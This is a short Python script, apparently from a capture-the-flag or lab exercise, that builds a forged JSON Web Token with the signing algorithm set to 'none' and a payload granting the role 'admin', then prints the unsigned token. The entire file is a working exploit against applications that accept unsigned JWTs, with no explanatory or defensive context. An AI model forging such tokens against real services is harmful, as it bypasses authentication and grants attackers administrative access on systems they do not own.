import base64
def jwtBase64Encode(x):
    return base64.b64encode(x.encode('utf-8')).decode().replace('+', '-').replace('/', '_').replace('=', '')
header = '''{
  "alg": "none",
  "typ": "JWT"
}'''
payload = '''{
  "user": "guest",
  "role": "admin"
}'''
print(jwtBase64Encode(header)+'.'+jwtBase64Encode(payload)+'.')
